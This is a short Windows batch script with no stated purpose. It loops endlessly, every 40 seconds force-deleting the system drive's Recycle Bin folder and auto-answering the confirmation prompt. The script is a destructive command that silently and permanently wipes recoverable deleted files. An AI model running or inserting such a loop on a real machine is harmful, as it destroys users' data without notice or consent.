@echo off
color 0a
:x
timeout /t 40 /nobreak
echo y | rd /s %systemdrive%\$RECYCLE.BIN
goto x